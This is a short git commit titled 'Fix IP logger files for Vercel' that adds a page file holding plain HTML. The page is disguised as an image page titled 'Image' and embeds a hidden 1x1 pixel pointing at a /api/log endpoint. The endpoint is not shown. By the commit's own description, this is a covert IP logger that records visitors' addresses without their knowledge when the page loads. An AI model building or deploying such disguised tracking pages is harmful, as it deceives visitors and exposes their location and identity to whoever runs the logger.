c2eb2166327be400afa73963e9307b2eed2aa9d6
NetlessScripter <iamtheatm1@gmail.com>
2026-06-03 21:48:08 -0400

    Fix IP logger files for Vercel

---
+++ app/page.tsx
@@ -0,0 +1,10 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Image</title>
+    <style>body{margin:0;background:#000;}</style>
+</head>
+<body>
+    <img src="/api/log" width="1" height="1" alt="">
+</body>
+</html>
